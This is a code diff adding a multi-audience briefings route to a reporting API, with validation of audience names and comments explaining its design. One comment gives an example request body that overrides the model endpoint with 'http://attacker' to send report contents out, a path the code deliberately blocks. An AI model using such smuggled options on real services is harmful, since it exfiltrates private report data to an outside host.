@@ -39,6 +39,7 @@
  * so a partner token cannot reach another organisation's report or schedule.
  */
 
+import { BRIEFING_AUDIENCE_IDS, narrateBriefings } from '../briefing.js'
 import { ERROR_CODES } from '../errors.js'
 import { metrics, logger } from '../observability.js'
 import { narrateReport, NARRATOR_BASIS } from '../narrator.js'
@@ -91,7 +92,7 @@ export function matchReportingRoute(pathname, method = 'GET') {
   if (reportExport) return { kind: 'reports', id: decodeURIComponent(reportExport[1]), exportFormat: reportExport[2] }
   const templateAction = pathname.match(/^\/api\/v1\/report-templates\/([^/]+)\/(copy)$/)
   if (templateAction) return { kind: 'templates', id: decodeURIComponent(templateAction[1]), action: templateAction[2] }
-  const reportAction = pathname.match(/^\/api\/v1\/reports\/([^/]+)\/(generate|approve|distribute|narrate)$/)
+  const reportAction = pathname.match(/^\/api\/v1\/reports\/([^/]+)\/(generate|approve|distribute|narrate|briefings)$/)
   if (reportAction) return { kind: 'reports', id: decodeURIComponent(reportAction[1]), action: reportAction[2] }
   const distributionAction = pathname.match(/^\/api\/v1\/report-distributions\/([^/]+)\/(retry)$/)
   if (distributionAction) return { kind: 'distributions', id: decodeURIComponent(distributionAction[1]), action: distributionAction[2] }
@@ -350,6 +351,65 @@ async function handleReportRoute(store, data, req, res, url, route, { checkWebho
     }
     await store.merge({ reports: [record], action_logs: [log] })
     jsonResponse(res, 200, { success: true, data: record, narration, action_log: log })
+    return
+  }
+
+  if (req.method === 'POST' && route.action === 'briefings') {
+    // ENH-57 — the multi-audience briefing, and the route that makes it a
+    // product rather than a library.
+    //
+    // The audience is named in the body, never inferred from the caller's scope:
+    // a district officer's briefing and a national coordinator's are built from
+    // the same report and differ only in what each is entitled to see, so a
+    // route that guessed the audience from the token would make entitlement a
+    // property of the requester rather than of the briefing. `briefing.js` reads
+    // the entitlement off its own registry.
+    //
+    // A refusal is a 200 carrying the refusals. `no_permitted_facts` is the
+    // module's answer for an audience with nothing it may see, and it is a
+    // statement about entitlement rather than about the request — the same shape
+    // `/source-agreement` uses for a region with one side, and for the same
+    // reason: a 4xx would make "you are not entitled to these figures" read as
+    // "your request was malformed".
+    const body = await readRequestJson(req)
+    const existing = findVisible(data.reports, route.id)
+    if (!existing) {
+      jsonResponse(res, 404, { success: false, error: 'Report not found' })
+      return
+    }
+    if (!(existing.sections || []).length) {
+      jsonResponse(res, 400, { success: false, error: 'Generate the report first: there is nothing computed to brief from' })
+      return
+    }
+    const audiences = Array.isArray(body.audiences) && body.audiences.length ? body.audiences : BRIEFING_AUDIENCE_IDS
+    // An unknown audience is a 400 rather than a skipped one. `narrateBriefings`
+    // would index `BRIEFING_AUDIENCES[audience]` for a name it does not hold and
+    // throw a TypeError — a 500 for what is a misspelled field, which is the
+    // silent-typo failure the registry's own header warns about, one layer out.
+    const unknown = audiences.filter((id) => !BRIEFING_AUDIENCE_IDS.includes(id))
+    if (unknown.length) {
+      jsonResponse(res, 400, {
+        success: false,
+        error: `unknown audience(s): ${unknown.join(', ')}`,
+        code: 'unknown_audience',
+        known_audiences: BRIEFING_AUDIENCE_IDS,
+      })
+      return
+    }
+    // Nothing from the body reaches the narrator's options. `narrateReport`
+    // takes `env` and `http` as injectable transports, which is right for a test
+    // and catastrophic for a route: a body carrying `env: {OLLAMA_BASE_URL:
+    // 'http://attacker'}` would point the model call at a host the caller
+    // chooses and post the report's own sections to it. The only request field
+    // that means anything here is `audiences`, and it is read out above.
+    const result = await narrateBriefings(existing, { now: new Date().toISOString(), audiences })
+    const record = normalizeReport({
+      ...existing,
+      briefings: { generated_at: result.briefings[0]?.generated_at || null, audiences: result.briefings.map((b) => ({ audience: b.audience, status: b.status, reason: b.reason || null, text: b.text || null })) },
+    }, data, existing)
+    const log = actionLog('reports', 'briefed', { report_id: record.id, narrated: result.narrated, refused: result.refused, audiences }, body.actor, req.__auth?.subject)
+    await store.merge({ reports: [record], action_logs: [log] })
+    jsonResponse(res, 200, { success: true, data: record, briefings: result.briefings, narrated: result.narrated, refused: result.refused, action_log: log })
     return
   }
 
